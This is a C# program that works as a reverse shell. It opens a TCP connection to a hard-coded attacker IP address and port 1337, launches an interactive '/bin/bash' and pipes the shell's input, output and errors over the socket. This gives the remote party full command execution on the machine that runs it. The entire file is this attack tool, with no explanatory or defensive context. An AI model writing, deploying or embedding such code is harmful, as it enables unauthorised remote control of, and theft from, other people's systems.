using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            // Configuration
            string attackerIp = "172.26.4.232";
            int attackerPort = 1337;

            // Create TCP client
            TcpClient client = new TcpClient(attackerIp, attackerPort);
            Stream stream = client.GetStream();

            // Start bash process
            Process process = new Process();
            process.StartInfo.FileName = "/bin/bash";
            process.StartInfo.Arguments = "-i";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            // Copy process output to socket
            StreamReader processOutput = process.StandardOutput;
            StreamReader processError = process.StandardError;
            StreamWriter processInput = process.StandardInput;

            // Task to read from socket and write to process input
            var socketToProcess = Task.Run(() =>
            {
                byte[] buffer = new byte[1024];
                int bytesRead;
                try
                {
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string input = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        processInput.Write(input);
                    }
                }
                catch { }
            });

            // Task to read from process output and write to socket
            var processToSocket = Task.Run(() =>
            {
                try
                {
                    while (!process.HasExited)
                    {
                        string output = processOutput.ReadLine();
                        if (output != null)
                        {
                            byte[] outputBytes = Encoding.UTF8.GetBytes(output + "\n");
                            stream.Write(outputBytes, 0, outputBytes.Length);
                        }
                    }
                }
                catch { }
            });

            // Task to read from process error and write to socket
            var errorToSocket = Task.Run(() =>
            {
                try
                {
                    while (!process.HasExited)
                    {
                        string error = processError.ReadLine();
                        if (error != null)
                        {
                            byte[] errorBytes = Encoding.UTF8.GetBytes(error + "\n");
                            stream.Write(errorBytes, 0, errorBytes.Length);
                        }
                    }
                }
                catch { }
            });

            // Wait for process to exit
            process.WaitForExit();
            client.Close();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
